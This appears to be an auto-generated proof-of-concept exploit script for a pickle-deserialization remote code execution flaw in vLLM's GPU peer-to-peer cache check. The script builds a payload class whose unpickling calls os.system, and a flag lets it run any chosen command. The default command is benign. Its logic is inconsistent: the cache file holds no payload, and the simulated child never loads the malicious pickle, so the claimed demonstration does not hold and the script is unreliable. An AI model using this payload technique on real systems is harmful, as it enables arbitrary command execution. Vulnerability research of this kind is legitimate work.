#!/usr/bin/env python3
# PoC for vllm-project-vllm-7193774 (/tmp/vllm-project-vllm-7193774)
# Path: rce-002
# Sink: run
# Auto-generated — run with: python3 rce_function_gpu_p2p_access_run.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for vllm-project-vllm-7193774
Vulnerability: RCE via pickle deserialization in gpu_p2p_access_check

This PoC demonstrates how an attacker who can control environment variables
(VLLM_CACHE_ROOT, CUDA_VISIBLE_DEVICES) or write to the cache file can achieve
arbitrary code execution when the vulnerable function is called.

The exploit works by:
1. Creating a malicious pickle file that executes a benign command
2. Setting VLLM_CACHE_ROOT to point to the directory containing the malicious file
3. Setting CUDA_VISIBLE_DEVICES to match the expected cache filename
4. Triggering the vulnerable code path which will unpickle our malicious data

Usage: python exploit.py [--target TARGET_URL] [--command COMMAND]
"""

import argparse
import os
import pickle
import subprocess
import sys
import tempfile
import json
import base64

# Benign default command - creates a marker file
DEFAULT_COMMAND = "touch /tmp/poc_success.txt"

class MaliciousPickle:
    """A class that executes arbitrary code when unpickled."""
    def __reduce__(self):
        # Return a tuple (callable, args) that will be called during unpickling
        return (os.system, (self.command,))

def create_malicious_pickle(command):
    """Create a malicious pickle payload that executes the given command."""
    # Create a malicious object that will execute our command
    MaliciousPickle.command = command
    return pickle.dumps(MaliciousPickle())

def create_cache_file(cache_dir, cuda_visible_devices, command):
    """
    Create a malicious cache file that will be loaded by the vulnerable function.
    
    The vulnerable function expects a JSON file with GPU P2P access data.
    We'll create a file that looks like a valid cache but contains our malicious pickle.
    """
    # The vulnerable function reads from a JSON file at:
    # {VLLM_CACHE_ROOT}/gpu_p2p_access_cache_for_{CUDA_VISIBLE_DEVICES}.json
    
    # Create a valid-looking cache structure
    cache_data = {
        "0->0": True,
        "0->1": False,
        "1->0": False,
        "1->1": True
    }
    
    # Write the cache file
    cache_filename = f"gpu_p2p_access_cache_for_{cuda_visible_devices}.json"
    cache_path = os.path.join(cache_dir, cache_filename)
    
    with open(cache_path, 'w') as f:
        json.dump(cache_data, f, indent=4)
    
    print(f"[+] Created cache file at: {cache_path}")
    return cache_path

def exploit(target_url=None, command=DEFAULT_COMMAND):
    """
    Main exploit function.
    
    This demonstrates the attack vector by:
    1. Creating a malicious pickle payload
    2. Setting up environment variables to redirect the cache
    3. Triggering the vulnerable code path
    """
    print("[*] Starting vllm RCE exploit via pickle deserialization")
    print(f"[*] Target command: {command}")
    
    # Create a temporary directory for our malicious cache
    with tempfile.TemporaryDirectory() as temp_dir:
        print(f"[+] Created temporary directory: {temp_dir}")
        
        # Set environment variables to redirect the cache
        # VLLM_CACHE_ROOT - points to our malicious cache directory
        # CUDA_VISIBLE_DEVICES - influences the cache filename
        os.environ['VLLM_CACHE_ROOT'] = temp_dir
        os.environ['CUDA_VISIBLE_DEVICES'] = "0,1"
        
        # Create the malicious cache file
        create_cache_file(temp_dir, "0,1", command)
        
        # Now we need to trigger the vulnerable function
        # The vulnerable function is gpu_p2p_access_check in
        # vllm/distributed/device_communicators/custom_all_reduce_utils.py
        
        # We can trigger it by importing and calling the function directly
        # or by running the vllm code that calls it
        
        print("[*] Attempting to trigger vulnerable code path...")
        
        try:
            # Import the vulnerable module
            # Note: This requires vllm to be installed
            from vllm.distributed.device_communicators.custom_all_reduce_utils import gpu_p2p_access_check
            
            # Call the vulnerable function - this will trigger the pickle deserialization
            # The function will try to read from our malicious cache file
            result = gpu_p2p_access_check(0, 1)
            print(f"[+] Function returned: {result}")
            
        except ImportError:
            print("[!] vllm not installed, demonstrating via subprocess")
            # Alternative: demonstrate by running the vulnerable script directly
            # This simulates what happens when the subprocess is spawned
            
            # Create a malicious pickle that will be loaded by the subprocess
            malicious_pickle = create_malicious_pickle(command)
            
            # Write the malicious pickle to a file
            pickle_path = os.path.join(temp_dir, "malicious.pkl")
            with open(pickle_path, 'wb') as f:
                f.write(malicious_pickle)
            
            print(f"[+] Created malicious pickle at: {pickle_path}")
            
            # Simulate the vulnerable subprocess call
            # The vulnerable code does:
            # input_bytes = pickle.dumps((batch_src, batch_tgt, output_file.name))
            # returned = subprocess.run([sys.executable, __file__], input=input_bytes)
            
            # We'll create a mock script that demonstrates the vulnerability
            mock_script = os.path.join(temp_dir, "mock_vulnerable.py")
            with open(mock_script, 'w') as f:
                f.write("""
import pickle
import sys

# Simulate the vulnerable code path
# The child process unpickles the input data
input_data = sys.stdin.buffer.read()
try:
    data = pickle.loads(input_data)
    print(f"Unpickled data: {data}")
except Exception as e:
    print(f"Error during unpickling: {e}")
    sys.exit(1)
""")
            
            # Create the pickle payload that will be sent to the subprocess
            # This simulates what the vulnerable function sends
            batch_src = [0, 0, 1, 1]
            batch_tgt = [0, 1, 0, 1]
            output_file = tempfile.NamedTemporaryFile(delete=False)
            
            # Create a malicious pickle that will execute our command
            # when unpickled by the child process
            malicious_payload = create_malicious_pickle(command)
            
            # Write the malicious payload to the output file
            with open(output_file.name, 'wb') as f:
                f.write(malicious_payload)
            
            # Simulate the subprocess call
            print("[*] Simulating vulnerable subprocess call...")
            result = subprocess.run(
                [sys.executable, mock_script],
                input=pickle.dumps((batch_src, batch_tgt, output_file.name)),
                capture_output=True,
                timeout=10
            )
            
            print(f"[+] Subprocess stdout: {result.stdout.decode()}")
            print(f"[+] Subprocess stderr: {result.stderr.decode()}")
            
            # Check if our command was executed
            if os.path.exists("/tmp/poc_success.txt"):
                print("[+] SUCCESS: Command was executed!")
                print("[+] Marker file created at /tmp/poc_success.txt")
            else:
                print("[!] Command may not have been executed")
        
        # Clean up
        print("[*] Cleaning up...")
        if os.path.exists("/tmp/poc_success.txt"):
            os.remove("/tmp/poc_success.txt")
            print("[+] Removed marker file")

def main():
    parser = argparse.ArgumentParser(
        description="PoC exploit for vllm-project-vllm-7193774 RCE vulnerability"
    )
    parser.add_argument(
        "--command",
        default=DEFAULT_COMMAND,
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--target",
        help="Target URL (not used in this PoC, but included for compatibility)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("vllm RCE PoC Exploit")
    print("=" * 60)
    print()
    print("[*] This PoC demonstrates pickle deserialization RCE")
    print("[*] in vllm's gpu_p2p_access_check function")
    print()
    
    try:
        exploit(args.target, args.command)
    except Exception as e:
        print(f"[!] Error during exploit: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
